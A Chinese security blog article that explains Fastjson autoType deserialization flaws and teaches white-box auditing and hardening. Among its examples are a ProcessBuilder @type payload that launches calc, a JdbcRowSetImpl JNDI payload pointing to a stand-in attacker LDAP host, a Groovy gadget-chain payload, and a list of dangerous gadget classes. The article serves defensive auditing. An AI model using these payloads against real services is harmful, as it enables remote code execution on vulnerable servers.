> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzMDY2MDA2Ng==&mid=2247486054&idx=1&sn=89e0ec0a512bd0d3a5c1416b85f6ce29

#  Fastjson漏洞：原理剖析与白盒审计实战  
原创 Eleven Liu  安全有术   2025-06-16 00:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSKf4G7kcviaqwfD0iaJmXLcgarGrAKtL3TDHhcLfE9cj6x0NedPZxV5C1TxZmDl7aAtOPXhGzdV60kT4baESTzg/640?wx_fmt=jpeg&from=appmsg "")  
  
在Java生态中，  
Fastjson  
以其卓越的性能成为  
json  
处理的明星库，然而其复杂的反序列化机制却暗藏致命风险。本文将回顾  
Fastjson  
漏洞的核心原理，并通过白盒审计揪出这些安全隐患。  
  
### 一、Fastjson使用的简单demo  
  

```
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.annotation.JSONField;
import com.alibaba.fastjson.annotation.JSONType;
import com.alibaba.fastjson.serializer.SerializerFeature;
public class UserDemo {
    public static void main(String[] args) {
        Person person1 = new Person(&#34;张三&#34;, 18);
        String jsonString1 = JSON.toJSONString(person1, SerializerFeature.WriteClassName);
        System.out.println(jsonString1);
        String jsonString2 = &#34;{\&#34;UserAge\&#34;:20,\&#34;UserName\&#34;:\&#34;李四\&#34;,}&#34;;
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + &#34; &#34; + person2.getAge());
    }
    // 定义一个简单的 Java 类
    @JSONType(orders = {&#34;UserName&#34;, &#34;UserAge&#34;})
    public static class Person {
        @JSONField(name=&#34;UserName&#34;)
        private String name;
        @JSONField(name =&#34;UserAge&#34;)
        private int age;
        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }
        public String getName() {
            return name;
        }
        public int getAge() {
            return age;
        }
    }
}
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSKf4G7kcvh79aWQIvtVKPFTUC4PwhUH3eqvwK1ds1fkYChaHs8ic2K4Hp8y1utaH5SQibvqicJ5Gj1KfJWn2WYtw/640?wx_fmt=png&from=appmsg "")  
  
  
在  
上面的dem  
o中我  
们定义了一个
```
Pers
```


```
on
```

  
类，并设置了
```
age
```

  
以及
```
name
```

  
两个属性，并  
初始化了一个对象person1，然后通过  
 JSON.toJSONString
```
去把对象转化为
```


```
json
```

  
字符串。定义了一个jsonString2字符串，通过
```
JSON
```

  
.  
parseObject  
把  

```
json
```

  
字符串转换为
```
Java
```

  
对象。  
因为  
jsonString2 的字段名与Person类的属性名不相同，所在，在demo中  
使用了@JSONField注解来指定Java类的属性和JSON字段之间的映射关系。  
  
  
Fastjson  
反序列化漏洞都会提到@type注解，它是用于标识JSON字符串中的某个属性是一个Java对象的类型，当  
Fastjson  
从JSON字符串反序列化为Java对象时，如果JSON字符串中包含@type属性，fastjson会根据该属性的值来确定反序列化后的Java对象的类型。如下示例，通过  
@type弹出计算机窗口，  
由于fastjson在1.2.24之后默认禁用Autotype，因此这里我们通过ParserConfig.getGlobalInstance().addAccept("java.lang")来开启。  

```
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;
import java.util.List;
public class TypeDemo {
    public static void main(String[] args) {
        String jsonString = &#34;[{\&#34;@type\&#34;:\&#34;java.lang.ProcessBuilder\&#34;, \&#34;command\&#34;:[\&#34;calc\&#34;]}]&#34;;
        ParserConfig.getGlobalInstance().addAccept(&#34;java.lang&#34;);
        List<ProcessBuilder> list = JSON.parseArray(jsonString, ProcessBuilder.class);
        // 触发执行
        try {
            list.get(0).start();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    }
```

  
  
二、漏洞本质：AutoType的潘多拉魔盒  
  
**Fastjson漏洞根源**  
在于它  
的
```
autoType
```

  
特性，当反序列化过程中遇到
```
@type
```

  
字段时，  
Fastjson  
会尝试动态加载并实例化指定类。攻击者精心构造恶意  
json  
数据，诱导应用加载危险类，触发RCE、文件读取等攻击：  

```
{
  &#34;@type&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;,
  &#34;dataSourceName&#34;: &#34;ldap://attacker.com/Exploit&#34;,
  &#34;autoCommit&#34;: true
}
```

  
**三大核心漏洞链**  
：  
1. **JNDI注入（经典1.2.24漏洞）**
```


```

  
  
1. **TemplatesImpl字节码注入**  
  
利用
```
_bytecodes
```

  
字段加载恶意字节码 → 通过
```
getOutputProperties()
```

  
触发执行  
关键条件：需开启Feature.SupportNonPublicField  
  
1. **新型Groovy漏洞链**  
  

```
{
  &#34;@type&#34;: &#34;org.codehaus.groovy.runtime.ConvertedClosure&#34;,
  &#34;method&#34;: &#34;execute&#34;,
  &#34;delegate&#34;: {
    &#34;@type&#34;: &#34;org.codehaus.groovy.runtime.MethodClosure&#34;,
    &#34;method&#34;: &#34;start&#34;,
    &#34;owner&#34;: &#34;groovy.lang.Process&#34;
  }
}
```

### 三、白盒审计四步定位法  
#### 步骤1：识别反序列化入口  
  
全局搜索高风险方法：  

```
// 危险方法
JSON.parseObject(input);
JSON.parse(input, Feature.SupportAutoType);
```

#### 步骤2：检查AutoType配置  
  
审计防御机制有效性：  

```
// 危险配置
ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 
ParserConfig.getGlobalInstance().setSafeMode(false); 


// 安全配置（推荐）
ParserConfig.getGlobalInstance().setSafeMode(true); // 启用安全模式
```

#### 步骤3：验证黑名单机制  
  
检查是否使用过时防御方案：  

```
// 易被绕过的旧方案（已失效）
ParserConfig.getGlobalInstance().addDeny(&#34;com.sun.&#34;);
```

#### 步骤4：追踪敏感调用链  
  
重点关注危险类：  

```
com.sun.rowset.JdbcRowSetImpl
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
org.codehaus.groovy.runtime.ConvertedClosure 
```

### 四、纵深防御方案  
1. **强制版本升级**  
  

```
<!-- 安全版本基线 -->
<dependency>
  <groupId>com.alibaba</groupId>
  <artifactId>fastjson</artifactId>
  <version>1.2.83</version> <!-- 或 ≥2.0.48 -->
</dependency>
```

  
**2、启用终极防御——安全模式**  

```
// 完全禁用autoType（豁免少数基础类）
ParserConfig.getGlobalInstance().setSafeMode(true);
```

  
**3、精准白名单控制**  

```
// 允许可信类反序列化
ParserConfig.getGlobalInstance().addAccept(&#34;com.company.safe.&#34;);
```

  
### 五、安全基线与自检清单  
> **三条安全基线**  
：  
> 非必要不开启AutoType生产环境强制启用安全模式用户输入都是不可信的，必须严格过滤  
  
  
**自检清单**  
：  
- FastJSON版本 ≥1.2.83 或 ≥2.0.48  
  
- 
```
setSafeMode(true)
```

  
全局启用  
  
- 代码中无
```
Feature.SupportAutoType
```

  
和
```
SupportNonPublicField
```

  
  
- 新增Groovy等组件依赖时重新评估风险  
  
- 关键服务部署RASP进行行为拦截  
  
